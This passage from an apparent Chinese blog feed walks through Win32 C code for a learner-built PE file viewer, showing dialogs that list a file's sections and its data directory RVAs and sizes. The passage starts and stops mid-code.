IDC_BUTTON_PEVIEW_DIR :<br>DialogBox(hAppInstance, MAKEINTRESOURCE(IDD_DIALOG_DIR),hwndDlg,DirDialogProc);<br><span class="hljs-keyword">return</span> TRUE;<br>&#125;<br><span class="hljs-keyword">return</span> FALSE ;<br>&#125;<br><br><span class="hljs-keyword">case</span> WM_CLOSE:<br>&#123;<br>EndDialog(hwndDlg, <span class="hljs-number">0</span>);<br><span class="hljs-keyword">return</span> TRUE;<br>&#125;<br><span class="hljs-keyword">return</span> FALSE ;<br>&#125;<br><br><br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br></code></pre></td></tr></table></figure><p>点击区段按钮，将会弹出对话框，显示该PE文件所含区段：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/02/img/PE%20Tool%20%E5%BC%80%E5%8F%91%E6%97%A5%E8%AE%B0%202%20-%20PE%E6%96%87%E4%BB%B6%E6%9F%A5%E7%9C%8B.assets/image-20220110213904729.png" alt="image-20220110213904729"></p><p>对节表对话框设置的代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><code class="hljs c">VOID <span class="hljs-title function_">InitSectionView</span><span class="hljs-params">(HWND hwndDlg)</span><br>&#123;<br><span class="hljs-comment">//1、初始化列名信息：</span><br>LV_COLUMN lv;<br>HWND hListSection;<br><br><span class="hljs-comment">//初始化</span><br><span class="hljs-built_in">memset</span>(&amp;lv,<span class="hljs-number">0</span>,<span class="hljs-keyword">sizeof</span>(LV_COLUMN));<br><span class="hljs-comment">//获取IDC_LIST_PROCESS句柄</span><br>hListSection = GetDlgItem(hwndDlg,IDC_LIST_SECTION);<br><span class="hljs-comment">//设置整行选中</span><br>SendMessage(hListSection,LVM_SETEXTENDEDLISTVIEWSTYLE,LVS_EX_FULLROWSELECT,LVS_EX_FULLROWSELECT);<br><br><span class="hljs-comment">//第一列</span><br>lv.mask = LVCF_TEXT | LVCF_WIDTH | LVCF_SUBITEM;<br>lv.pszText = _T(<span class="hljs-string">&quot;节名&quot;</span>);<span class="hljs-comment">//列标题</span><br>lv.cx = <span class="hljs-number">50</span>;<br>lv.iSubItem = <span class="hljs-number">0</span>;<br>ListView_InsertColumn(hListSection, <span class="hljs-number">0</span>, &amp;lv);<br><span class="hljs-comment">//第二列</span><br>lv.pszText = _T(<span class="hljs-string">&quot;文件偏移&quot;</span>);<br>lv.cx = <span class="hljs-number">100</span>;<br>lv.iSubItem = <span class="hljs-number">1</span>;<br>ListView_InsertColumn(hListSection, <span class="hljs-number">1</span>, &amp;lv);<br><span class="hljs-comment">//第三列</span><br>lv.pszText = _T(<span class="hljs-string">&quot;文件大小&quot;</span>);<br>lv.cx = <span class="hljs-number">100</span>;<br>lv.iSubItem = <span class="hljs-number">2</span>;<br>ListView_InsertColumn(hListSection, <span class="hljs-number">2</span>, &amp;lv);<br><span class="hljs-comment">//第四列</span><br>lv.pszText = _T(<span class="hljs-string">&quot;内存偏移&quot;</span>);<br>lv.cx = <span class="hljs-number">100</span>;<br>lv.iSubItem = <span class="hljs-number">3</span>;<br>ListView_InsertColumn(hListSection, <span class="hljs-number">3</span>, &amp;lv);<br><span class="hljs-comment">//第五列</span><br>lv.pszText = _T(<span class="hljs-string">&quot;内存大小&quot;</span>);<br>lv.cx = <span class="hljs-number">100</span>;<br>lv.iSubItem = <span class="hljs-number">4</span>;<br>ListView_InsertColumn(hListSection, <span class="hljs-number">4</span>, &amp;lv);<br><span class="hljs-comment">//第六列</span><br>lv.pszText = _T(<span class="hljs-string">&quot;节区属性&quot;</span>);<br>lv.cx = <span class="hljs-number">100</span>;<br>lv.iSubItem = <span class="hljs-number">4</span>;<br>ListView_InsertColumn(hListSection, <span class="hljs-number">5</span>, &amp;lv);<br><br><br><br>ReadPEFile(szFileName, &amp;pFileBuffer);<br>pDosHeader = (PIMAGE_DOS_HEADER) pFileBuffer;<br>pNTHeader = (PIMAGE_NT_HEADERS) ((DWORD) pFileBuffer + pDosHeader-&gt;e_lfanew);<br>PIMAGE_SECTION_HEADER pSectionHeader = IMAGE_FIRST_SECTION(pNTHeader);<br><br>LPSTR sectionData[<span class="hljs-number">6</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br>TCHAR name[<span class="hljs-number">0x40</span>];<br>TCHAR virtualAddress[<span class="hljs-number">0x40</span>];<br>TCHAR sizeOfRawData[<span class="hljs-number">0x40</span>];<br>TCHAR pointerToRawData[<span class="hljs-number">0x40</span>];<br>TCHAR virtualSize[<span class="hljs-number">0x40</span>];<br>TCHAR characteristics[<span class="hljs-number">0x40</span>];<br><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; pFileHeader-&gt;NumberOfSections; i++) &#123;<br><span class="hljs-built_in">sprintf</span>(name, _T(<span class="hljs-string">&quot;%s&quot;</span>), pSectionHeader[i].Name);<br>sectionData[<span class="hljs-number">0</span>] = name;<br><br><span class="hljs-built_in">sprintf</span>(virtualAddress, _T(<span class="hljs-string">&quot;0x%X&quot;</span>), pSectionHeader[i].VirtualAddress);<br>sectionData[<span class="hljs-number">1</span>] = virtualAddress;<br><br><span class="hljs-built_in">sprintf</span>(sizeOfRawData, _T(<span class="hljs-string">&quot;0x%X&quot;</span>), pSectionHeader[i].SizeOfRawData);<br>sectionData[<span class="hljs-number">2</span>] = sizeOfRawData;<br><br><span class="hljs-built_in">sprintf</span>(pointerToRawData, _T(<span class="hljs-string">&quot;0x%X&quot;</span>), pSectionHeader[i].PointerToRawData);<br>sectionData[<span class="hljs-number">3</span>] = pointerToRawData;<br><br><span class="hljs-built_in">sprintf</span>(virtualSize, _T(<span class="hljs-string">&quot;0x%X&quot;</span>), pSectionHeader[i].Misc.VirtualSize);<br>sectionData[<span class="hljs-number">4</span>] = virtualSize;<br><br><span class="hljs-built_in">sprintf</span>(characteristics, _T(<span class="hljs-string">&quot;0x%08X&quot;</span>), pSectionHeader[i].Characteristics);<br>sectionData[<span class="hljs-number">5</span>] = characteristics;<br><br>InsertRow(hListSection,sectionData);<br>&#125;<br><br><span class="hljs-built_in">free</span>(pFileBuffer);<br>&#125;<br></code></pre></td></tr></table></figure><p>最终实现效果：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/02/img/PE%20Tool%20%E5%BC%80%E5%8F%91%E6%97%A5%E8%AE%B0%202%20-%20PE%E6%96%87%E4%BB%B6%E6%9F%A5%E7%9C%8B.assets/image-20220110214459957.png" alt="image-20220110214459957"></p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/02/img/PE%20Tool%20%E5%BC%80%E5%8F%91%E6%97%A5%E8%AE%B0%202%20-%20PE%E6%96%87%E4%BB%B6%E6%9F%A5%E7%9C%8B.assets/image-20220110214527351.png" alt="image-20220110214527351"></p>]]></content>
    
    
    <categories>
      
      <category>Binary</category>
      
      <category>滴水学习</category>
      
      <category>项目开发</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Binary</tag>
      
      <tag>Win32</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PETOOL开发日记3 - Directory解析</title>
    <link href="/2022/02/20/%E4%BA%8C%E8%BF%9B%E5%88%B6/PE%20Tool%20%E5%BC%80%E5%8F%91%E6%97%A5%E8%AE%B0%203%20-%20Directory%E8%A7%A3%E6%9E%90/"/>
    <url>/2022/02/20/%E4%BA%8C%E8%BF%9B%E5%88%B6/PE%20Tool%20%E5%BC%80%E5%8F%91%E6%97%A5%E8%AE%B0%203%20-%20Directory%E8%A7%A3%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<p>本节将进一步完善PE TOOL的功能，添加对PE头的Directory解析。</p><p>接上文，本节将完成的是目录按钮背后的功能。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/02/img/PE%20Tool%20%E5%BC%80%E5%8F%91%E6%97%A5%E8%AE%B0%203%20-%20Directory%E8%A7%A3%E6%9E%90.assets/image-20220110214822067.png" alt="image-20220110214822067"></p><p>点击目录按钮，将会弹出如下对话框：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/02/img/PE%20Tool%20%E5%BC%80%E5%8F%91%E6%97%A5%E8%AE%B0%203%20-%20Directory%E8%A7%A3%E6%9E%90.assets/image-20220110214959698.png" alt="image-20220110214959698"></p><p>该对话框的消息处理函数如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs c">BOOL CALLBACK <span class="hljs-title function_">DirDialogProc</span><span class="hljs-params">(</span><br><span class="hljs-params">HWND hwndDlg,  <span class="hljs-comment">// handle to dialog box</span></span><br><span class="hljs-params">UINT uMsg,     <span class="hljs-comment">// message</span></span><br><span class="hljs-params">WPARAM wParam, <span class="hljs-comment">// first message parameter</span></span><br><span class="hljs-params">LPARAM lParam  <span class="hljs-comment">// second message parameter</span></span><br><span class="hljs-params">)</span><br>&#123;<br><span class="hljs-keyword">switch</span>(uMsg)<br>&#123;<br><span class="hljs-keyword">case</span>  WM_INITDIALOG :<br>&#123;<br>InitDirectoryView(hwndDlg);<br><span class="hljs-keyword">return</span> TRUE ;<br>&#125;<br><span class="hljs-keyword">case</span>  WM_COMMAND :<br>&#123;<br><span class="hljs-keyword">switch</span> (LOWORD (wParam))<br>&#123;<br><span class="hljs-keyword">case</span>   IDC_BUTTON_DIR_CLOSE :<br>&#123;<br>EndDialog(hwndDlg, <span class="hljs-number">0</span>);<br><span class="hljs-keyword">return</span> TRUE;<br>&#125;<br><span class="hljs-keyword">case</span>   IDC_BUTTON_DIR_IMPORT :<br>&#123;<br>detailDirNum = IMPORT_DETAIL;<br>DialogBox(hAppInstance, MAKEINTRESOURCE(IDD_DIALOG_DETAIL),hwndDlg,DirDetailDialogProc);<br><span class="hljs-keyword">return</span> TRUE;<br>&#125;<br><span class="hljs-keyword">case</span>   IDC_BUTTON_DIR_EXPORT :<br>&#123;<br>detailDirNum = EXPORT_DETAIL;<br>DialogBox(hAppInstance, MAKEINTRESOURCE(IDD_DIALOG_DETAIL),hwndDlg,DirDetailDialogProc);<br><span class="hljs-keyword">return</span> TRUE;<br>&#125;<br><span class="hljs-keyword">case</span>   IDC_BUTTON_DIR_RESOURCE :<br>&#123;<br>detailDirNum = RESOURCE_DETAIL;<br>DialogBox(hAppInstance, MAKEINTRESOURCE(IDD_DIALOG_DETAIL),hwndDlg,DirDetailDialogProc);<br><span class="hljs-keyword">return</span> TRUE;<br>&#125;<br><span class="hljs-keyword">case</span>   IDC_BUTTON_DIR_RELOC :<br>&#123;<br>detailDirNum = RELOCATION_DETAIL;<br>DialogBox(hAppInstance, MAKEINTRESOURCE(IDD_DIALOG_DETAIL),hwndDlg,DirDetailDialogProc);<br><span class="hljs-keyword">return</span> TRUE;<br>&#125;<br><br>&#125;<br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br><span class="hljs-keyword">case</span> WM_CLOSE:<br>&#123;<br>EndDialog(hwndDlg, <span class="hljs-number">0</span>);<br><span class="hljs-keyword">return</span> TRUE;<br>&#125;<br>&#125;<br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br></code></pre></td></tr></table></figure><p>该对话框的初始函数是InitDirectoryView，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br></pre></td><td class="code"><pre><code class="hljs c">VOID <span class="hljs-title function_">InitDirectoryView</span><span class="hljs-params">(HWND hwndDlg)</span><br>&#123;<br>ReadPEFile(szFileName, &amp;pFileBuffer);<br>pDosHeader = (PIMAGE_DOS_HEADER) pFileBuffer;<br>pNTHeader = (PIMAGE_NT_HEADERS) ((DWORD) pFileBuffer + pDosHeader-&gt;e_lfanew);<br>pFileHeader = (PIMAGE_FILE_HEADER) (((DWORD) pNTHeader) + <span class="hljs-number">4</span>);<br>pOptionHeader = (PIMAGE_OPTIONAL_HEADER32) ((DWORD) pFileHeader + IMAGE_SIZEOF_FILE_HEADER);<br>PIMAGE_DATA_DIRECTORY dirHeader = pOptionHeader-&gt;DataDirectory;<br><br>TCHAR strBuffer[<span class="hljs-number">0x20</span>];<br><br><span class="hljs-built_in">sprintf</span>(strBuffer, _T(<span class="hljs-string">&quot;0x%08X&quot;</span>), dirHeader[<span class="hljs-number">0</span>].VirtualAddress);<br>SetDlgItemText(hwndDlg,IDC_EDIT_DIR_EXPORT_RVA, strBuffer);<br><span class="hljs-built_in">memset</span>(strBuffer,<span class="hljs-number">0x20</span> ,<span class="hljs-keyword">sizeof</span>(TCHAR));<br><br><span class="hljs-built_in">sprintf</span>(strBuffer, _T(<span class="hljs-string">&quot;0x%08X&quot;</span>), dirHeader[<span class="hljs-number">1</span>].VirtualAddress);<br>SetDlgItemText(hwndDlg,IDC_EDIT_DIR_IMPORT_RVA, strBuffer);<br><span class="hljs-built_in">memset</span>(strBuffer,<span class="hljs-number">0x20</span> ,<span class="hljs-keyword">sizeof</span>(TCHAR));<br><br><span class="hljs-built_in">sprintf</span>(strBuffer, _T(<span class="hljs-string">&quot;0x%08X&quot;</span>), dirHeader[<span class="hljs-number">2</span>].VirtualAddress);<br>SetDlgItemText(hwndDlg,IDC_EDIT_DIR_RESOURCE_RVA, strBuffer);<br><span class="hljs-built_in">memset</span>(strBuffer,<span class="hljs-number">0x20</span> ,<span class="hljs-keyword">sizeof</span>(TCHAR));<br><br><span class="hljs-built_in">sprintf</span>(strBuffer, _T(<span class="hljs-string">&quot;0x%08X&quot;</span>), dirHeader[<span class="hljs-number">3</span>].VirtualAddress);<br>SetDlgItemText(hwndDlg,IDC_EDIT_DIR_EXCEPTION_RVA, strBuffer);<br><span class="hljs-built_in">memset</span>(strBuffer,<span class="hljs-number">0x20</span> ,<span class="hljs-keyword">sizeof</span>(TCHAR));<br><br><span class="hljs-built_in">sprintf</span>(strBuffer, _T(<span class="hljs-string">&quot;0x%08X&quot;</span>), dirHeader[<span class="hljs-number">4</span>].VirtualAddress);<br>SetDlgItemText(hwndDlg,IDC_EDIT_DIR_SEC_RVA, strBuffer);<br><span class="hljs-built_in">memset</span>(strBuffer,<span class="hljs-number">0x20</span> ,<span class="hljs-keyword">sizeof</span>(TCHAR));<br><br><span class="hljs-built_in">sprintf</span>(strBuffer, _T(<span class="hljs-string">&quot;0x%08X&quot;</span>), dirHeader[<span class="hljs-number">5</span>].VirtualAddress);<br>SetDlgItemText(hwndDlg,IDC_EDIT_DIR_RELOC_RVA, strBuffer);<br><span class="hljs-built_in">memset</span>(strBuffer,<span class="hljs-number">0x20</span> ,<span class="hljs-keyword">sizeof</span>(TCHAR));<br><br><span class="hljs-built_in">sprintf</span>(strBuffer, _T(<span class="hljs-string">&quot;0x%08X&quot;</span>), dirHeader[<span class="hljs-number">6</span>].VirtualAddress);<br>SetDlgItemText(hwndDlg,IDC_EDIT_DIR_DEBUG_RVA, strBuffer);<br><span class="hljs-built_in">memset</span>(strBuffer,<span class="hljs-number">0x20</span> ,<span class="hljs-keyword">sizeof</span>(TCHAR));<br><br><span class="hljs-built_in">sprintf</span>(strBuffer, _T(<span class="hljs-string">&quot;0x%08X&quot;</span>), dirHeader[<span class="hljs-number">7</span>].VirtualAddress);<br>SetDlgItemText(hwndDlg,IDC_EDIT_DIR_COPYRIGHT_RVA, strBuffer);<br><span class="hljs-built_in">memset</span>(strBuffer,<span class="hljs-number">0x20</span> ,<span class="hljs-keyword">sizeof</span>(TCHAR));<br><br><span class="hljs-built_in">sprintf</span>(strBuffer, _T(<span class="hljs-string">&quot;0x%08X&quot;</span>), dirHeader[<span class="hljs-number">8</span>].VirtualAddress);<br>SetDlgItemText(hwndDlg,IDC_EDIT_DIR_GPOINTER_RVA, strBuffer);<br><span class="hljs-built_in">memset</span>(strBuffer,<span class="hljs-number">0x20</span> ,<span class="hljs-keyword">sizeof</span>(TCHAR));<br><br><span class="hljs-built_in">sprintf</span>(strBuffer, _T(<span class="hljs-string">&quot;0x%08X&quot;</span>), dirHeader[<span class="hljs-number">9</span>].VirtualAddress);<br>SetDlgItemText(hwndDlg,IDC_EDIT_DIR_TLS_RVA, strBuffer);<br><span class="hljs-built_in">memset</span>(strBuffer,<span class="hljs-number">0x20</span> ,<span class="hljs-keyword">sizeof</span>(TCHAR));<br><br><span class="hljs-built_in">sprintf</span>(strBuffer, _T(<span class="hljs-string">&quot;0x%08X&quot;</span>), dirHeader[<span class="hljs-number">10</span>].VirtualAddress);<br>SetDlgItemText(hwndDlg,IDC_EDIT_DIR_IMPORTCONF_RVA, strBuffer);<br><span class="hljs-built_in">memset</span>(strBuffer,<span class="hljs-number">0x20</span> ,<span class="hljs-keyword">sizeof</span>(TCHAR));<br><br><span class="hljs-built_in">sprintf</span>(strBuffer, _T(<span class="hljs-string">&quot;0x%08X&quot;</span>), dirHeader[<span class="hljs-number">11</span>].VirtualAddress);<br>SetDlgItemText(hwndDlg,IDC_EDIT_DIR_BINDIMPORT_RVA, strBuffer);<br><span class="hljs-built_in">memset</span>(strBuffer,<span class="hljs-number">0x20</span> ,<span class="hljs-keyword">sizeof</span>(TCHAR));<br><br><span class="hljs-built_in">sprintf</span>(strBuffer, _T(<span class="hljs-string">&quot;0x%08X&quot;</span>), dirHeader[<span class="hljs-number">12</span>].VirtualAddress);<br>SetDlgItemText(hwndDlg,IDC_EDIT_DIR_IAT_RVA, strBuffer);<br><span class="hljs-built_in">memset</span>(strBuffer,<span class="hljs-number">0x20</span> ,<span class="hljs-keyword">sizeof</span>(TCHAR));<br><br><span class="hljs-built_in">sprintf</span>(strBuffer, _T(<span class="hljs-string">&quot;0x%08X&quot;</span>), dirHeader[<span class="hljs-number">13</span>].VirtualAddress);<br>SetDlgItemText(hwndDlg,IDC_EDIT_DIR_POSTIMPORT_RVA, strBuffer);<br><span class="hljs-built_in">memset</span>(strBuffer,<span class="hljs-number">0x20</span> ,<span class="hljs-keyword">sizeof</span>(TCHAR));<br><br><span class="hljs-built_in">sprintf</span>(strBuffer, _T(<span class="hljs-string">&quot;0x%08X&quot;</span>), dirHeader[<span class="hljs-number">14</span>].VirtualAddress);<br>SetDlgItemText(hwndDlg,IDC_EDIT_DIR_COM_RVA, strBuffer);<br><span class="hljs-built_in">memset</span>(strBuffer,<span class="hljs-number">0x20</span> ,<span class="hljs-keyword">sizeof</span>(TCHAR));<br><br><span class="hljs-built_in">sprintf</span>(strBuffer, _T(<span class="hljs-string">&quot;0x%08X&quot;</span>), dirHeader[<span class="hljs-number">15</span>].VirtualAddress);<br>SetDlgItemText(hwndDlg,IDC_EDIT_DIR_RESERVE_RVA, strBuffer);<br><span class="hljs-built_in">memset</span>(strBuffer,<span class="hljs-number">0x20</span> ,<span class="hljs-keyword">sizeof</span>(TCHAR));<br><span class="hljs-comment">//----------------------------------------------------------//</span><br><span class="hljs-built_in">sprintf</span>(strBuffer, _T(<span class="hljs-string">&quot;0x%X&quot;</span>), dirHeader[<span class="hljs-number">0</span>].Size);<br>SetDlgItemText(hwndDlg,IDC_EDIT_DIR_EXPORT_SIZE, strBuffer);<br><span class="hljs-built_in">memset</span>(strBuffer,<span class="hljs-number">0x20</span> ,<span class="hljs-keyword">sizeof</span>(TCHAR));<br><br><span class="hljs-built_in">sprintf</span>(strBuffer, _T(<span class="hljs-string">&quot;0x%X&quot;</span>), dirHeader[<span class="hljs-number">1</span>].Size);<br>SetDlgItemText(hwndDlg,IDC_EDIT_DIR_IMPORT_SIZE, strBuffer);<br><span class="hljs-built_in">memset</span>(strBuffer,<span class="hljs-number">0x20</span> ,<span class="hljs-keyword">sizeof</span>(TCHAR));<br><br><span class="hljs-built_in">sprintf</span>(strBuffer, _T(<span class="hljs-string">&quot;0x%X&quot;</span>), dirHeader[<span class="hljs-number">2</span>].Size);<br>SetDlgItemText(hwndDlg,IDC_EDIT_DIR_RESOURCE_SIZE, strBuffer);<br><span class="hljs-built_in">memset</span>(strBuffer,<span class="hljs-number">0x20</span> ,<span class="hljs-keyword">sizeof</span>(TCHAR));<br><br><span class="hljs-built_in">sprintf</span>(strBuffer, _T(<span class="hljs-string">&quot;0x%X&quot;</span>), dirHeader[<span class="hljs-number">3</span>].Size);<br>SetDlgItemText(hwndDlg,IDC_EDIT_DIR_EXCEPTION_SIZE, strBuffer);<br><span class="hljs-built_in">memset</span>(strBuffer,<span class="hljs-number">0x20</span> ,<span class="hljs-keyword">sizeof</span>(TCHAR));<br><br><span class="hljs-built_in">sprintf</span>(strBuffer, _T(<span class="hljs-string">&quot;0x%X&quot;</span>), dirHeader[<span class="hljs-number">4</span>].Size);<br>SetDlgItemText(hwndDlg,IDC_EDIT_DIR_SEC_SIZE, strBuffer);<br><span class="hljs-built_in">memset</span>(strBuffer,<span class="hljs-number">0x20</span> ,<span class="hljs-keyword">sizeof</span>(TCHAR));<br><br><span class="hljs-built_in">sprintf</span>(strBuffer, _T(<span class="hljs-string">&quot;0x%X&quot;</span>), dirHeader[<span class="hljs-number">5</span>].Size);<br>SetDlgItemText(hwndDlg,IDC_EDIT_DIR_RELOC_SIZE, strBuffer);<br><span class="hljs-built_in">memset</span>(strBuffer,<span class="hljs-number">0x20</span> ,<span class="hljs-keyword">sizeof</span>(TCHAR));<br><br><span class="hljs-built_in">sprintf</span>(strBuffer, _T(<span class="hljs-string">&quot;0x%X&quot;</span>), dirHeader[<span class="hljs-number">6</span>].Size);<br>SetDlgItemText(hwndDlg,IDC_EDIT_DIR_DEBUG_SIZE, strBuffer);<br><span class="hljs-built_in">memset</span>(strBuffer,<span class="hljs-number">0x20</span> ,<span class="hljs-keyword">sizeof</span>(TCHAR));<br><br><span class="hljs-built_in">sprintf</span>(strBuffer, _T(<span class="hljs-string">&quot;0x%X&quot;</span>), dirHeader[<span class="hljs-number">7</span>].Size);<br>SetDlgItemText(hwndDlg,IDC_EDIT_DIR_COPYRIGHT_SIZE, strBuffer);<br><span class="hljs-built_in">memset</span>(strBuffer,<span class="hljs-number">0x20</span> ,<span class="hljs-keyword">sizeof</span>(TCHAR));<br><br><span class="hljs-built_in">sprintf</span>(strBuffer, _T(<span class="hljs-string">&quot;0x%X&quot;</span>), dirHeader[<span class="hljs-number">8</span>].Size);<br>SetDlgItemText(hwndDlg,IDC_EDIT_DIR_GPOINTER_SIZE, strBuffer);<br><span class="hljs-built_in">memset</span>(strBuffer,<span class="hljs-number">0x20</span> ,<span class="hljs-keyword">sizeof</span>(TCHAR));<br><br><span class="hljs-built_in">sprintf</span>(strBuffer, _T(<span class="hljs-string">&quot;0x%X&quot;</span>), dirHeader[<span class="hljs-number">9</span>].Size);<br>SetDlgItemText(hwndDlg,IDC_EDIT_DIR_TLS_SIZE, strBuffer);<br><span class="hljs-built_in">memset</span>(strBuffer,<span class="hljs-number">0x20</span> ,<span class="hljs-keyword">sizeof</span>(TCHAR));<br><br><span class="hljs-built_in">sprintf</span>(strBuffer, _T(<span class="hljs-string">&quot;0x%X&quot;</span>), dirHeader[<span class="hljs-number">10</span>].Size);<br>SetDlgItemText(hwndDlg,IDC_EDIT_DIR_IMPORTCONF_SIZE, strBuffer);<br><span class="hljs-built_in">memset</span>(strBuffer,<span class="hljs-number">0x20</span> ,<span class="hljs-keyword">sizeof</span>(TCHAR));<br><br><span class="hljs-built_in">sprintf</span>(strBuffer, _T(<span class="hljs-string">&quot;0x%X&quot;</span>), dirHeader[<span class="hljs-number">11</span>].Size);<br>SetDlgItemText(hwndDlg,IDC_EDIT_DIR_BINDIMPORT_SIZE, strBuffer);<br><span class="hljs-built_in">memset</span>(strBuffer,<span class="hljs-number">0x20</span> ,<span class="hljs-keyword">sizeof</span>(TCHAR));<br><br><span 